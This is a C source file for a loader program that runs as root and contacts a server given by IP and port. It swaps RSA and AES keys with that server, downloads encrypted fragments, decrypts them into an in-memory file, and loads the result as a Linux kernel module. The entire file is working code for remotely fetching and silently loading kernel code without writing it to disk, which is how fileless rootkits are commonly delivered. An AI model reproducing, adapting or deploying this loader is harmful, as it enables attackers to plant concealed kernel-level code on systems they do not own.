#include <arpa/inet.h>
#include <limits.h>
#include <openssl/evp.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#include "../include/fraction.h"
#include "../include/http.h"
#include "../include/load.h"
#include "../include/log.h"
#include "../include/sock.h"
#include "../include/utils.h"

static void cleanup_fraction_array(fraction_t *array, int n_elem) {
  for (int i = 0; i < n_elem; i++) {
    fraction_free(&array[i]);
  }
  free(array);
}

static int do_connect(char *ip_address, char *port) {
  struct addrinfo hints, *ainfo;
  int sfd;

  setup_hints(&hints);

  if (h_getaddrinfo(ip_address, port, &hints, &ainfo) != 0) {
    log_error("Failed to resolve server address");
    return -1;
  }

  printf("Connecting to: %s:%s\n", ip_address, port);
  sfd = create_sock_and_conn(ainfo);
  if (sfd == -1) {
    log_error("Failed to create socket and connect");
    return -1;
  }
  freeaddrinfo(ainfo);

  return sfd;
}

static uint8_t *get_aes_key(int sfd, size_t *key_length) {
  EVP_PKEY *pkey = NULL;
  char *public_key = NULL;

  http_res_t http_post_res = {0};

  unsigned char *b64_decoded_aes_key;
  unsigned char *aes_key = NULL;
  size_t key_len = 0;

  pkey = generate_rsa_private_key();
  if (pkey == NULL) {
    return NULL;
  }

  public_key = write_rsa_public_key(pkey);
  if (public_key == NULL) {
    EVP_PKEY_free(pkey);
    return NULL;
  }

  /* Receive and decrypt AES key from server */
  if (http_post(sfd, "/", "application/octect-stream", public_key,
                &http_post_res) != HTTP_SUCCESS) {
    log_error("Failed to send RSA public key");
    free(public_key);
    EVP_PKEY_free(pkey);
    return NULL;
  }

  log_info("Base64 encoded key: %s", http_post_res.data);
  base64_decode(http_post_res.data, &b64_decoded_aes_key, &key_len);
  log_info("Key size (decoded): %zu", key_len);

  aes_key = decrypt_rsa_oaep_evp(pkey, b64_decoded_aes_key, key_len, &key_len);
  if (aes_key == NULL) {
    log_error("Failed to decrypt data from server");
    free(b64_decoded_aes_key);
    http_free(&http_post_res);
    free(public_key);
    EVP_PKEY_free(pkey);
    return NULL;
  }

  free(b64_decoded_aes_key);
  http_free(&http_post_res);
  free(public_key);
  EVP_PKEY_free(pkey);

  *key_length = key_len;
  return aes_key;
}

static fraction_t *fetch_fractions(int sfd, int *fraction_count,
                                   char *ip_address, char *port) {
  http_res_t http_fraction_res = {0};

  fraction_t *fractions = NULL;
  char fraction_url[50];
  int i, num_fractions;

  snprintf(fraction_url, 50, "http://%s:%s/stream", ip_address, port);

  if (http_get(sfd, "/size", &http_fraction_res) != HTTP_SUCCESS) {
    log_error("Failed to retrieve fraction links");
  }

  log_debug("Retrieved fraction links");

  num_fractions = atoi(http_fraction_res.data);
  log_debug("Fetching %d fractions", num_fractions);

  fractions = calloc(num_fractions, sizeof(fraction_t));
  if (!fractions) {
    log_error("Failed to allocate memory for fractions");
    http_free(&http_fraction_res);
    return NULL;
  }

  i = 0;
  while (i < num_fractions) {
    log_debug("Downloading fraction no.%d", i);

    if (download_fraction(sfd, fraction_url, &fractions[i]) != 0) {
      log_error("Failed to download fraction");

      // we have to cleanup only until i because the other fractions have not
      // been initialized anyhow
      http_free(&http_fraction_res);
      cleanup_fraction_array(fractions, i);
      return NULL;
    }

    i++;
  }

  http_free(&http_fraction_res);
  *fraction_count = i;
  return fractions;
}

static bool validate_ip(const char *ip) {
  struct in_addr addr;

  if (inet_pton(AF_INET, ip, &addr) != 1) {
    return false;
  }

  return true;
}

static bool validate_port(const char *port) {
  long portl;

  errno = 0;

  portl = strtol(port, NULL, 10);

  if (errno != 0)
    return false;
  if (portl < 0 || portl > USHRT_MAX)
    return false;

  return true;
}

int main(int argc, char **argv) {

  char *ip_address;
  char *port;

  int sfd = -1; // to be extra professional
  int memfd = -1;

  unsigned char *aes_key = NULL;
  size_t key_len = 0;

  fraction_t *fractions = NULL;
  int fraction_count;

  if (argc != 3) {
    log_error("Usage: %s IP PORT", argv[0]);
    goto cleanup;
  }

  ip_address = argv[1];
  port = argv[2];

  // validate IP and port
  if (!validate_ip(ip_address)) {
    log_error("Invalid IP, format as %%d.%%d.%%d.%%d");
    goto cleanup;
  }

  if (!validate_port(port)) {
    log_error("Invalid port, should be a number in the range (0-%d)",
              USHRT_MAX);
    goto cleanup;
  }

  /* We need root permissions to load LKMs */
  if (geteuid() != 0) {
    log_error("This program needs to be run as root!");
    goto cleanup;
  }

  /* initialize PRNG and set logging level */
  init_random();
  log_set_level(LOG_DEBUG);

  /* open a connection to the server */
  sfd = do_connect(ip_address, port);
  if (sfd < 0) {
    goto cleanup;
  }

  /* receive the AES key */
  aes_key = get_aes_key(sfd, &key_len);
  if (aes_key == NULL) {
    goto cleanup;
  }

  /* download and sort the fractions*/
  fractions = fetch_fractions(sfd, &fraction_count, ip_address, port);
  if (fractions == NULL) {
    goto cleanup;
  }
  qsort(fractions, fraction_count, sizeof(fraction_t), compare_fractions);
  log_info("Downloaded fractions");

  /* decrypt the fractions and assemble the LKM */

  memfd = decrypt_lkm(fractions, fraction_count, aes_key);
  if (memfd < 0) {
    log_error("There was an error decrypting the module");
    cleanup_fraction_array(fractions, fraction_count);
    goto cleanup;
  }

  if (load_lkm(memfd) == -1) {
    log_error("Failed to load LKM");
    goto cleanup;
  }

  /* cleanup */
  close(sfd);
  close(memfd);
  cleanup_fraction_array(fractions, fraction_count);
  free(aes_key);

  return EXIT_SUCCESS; // hooray!!!

  /* Encapsulate cleanup */
cleanup:
  if (sfd >= 0)
    close(sfd);
  if (memfd >= 0)
    close(memfd);
  if (fractions)
    cleanup_fraction_array(fractions, fraction_count);

  free(aes_key);

  return EXIT_FAILURE;
}
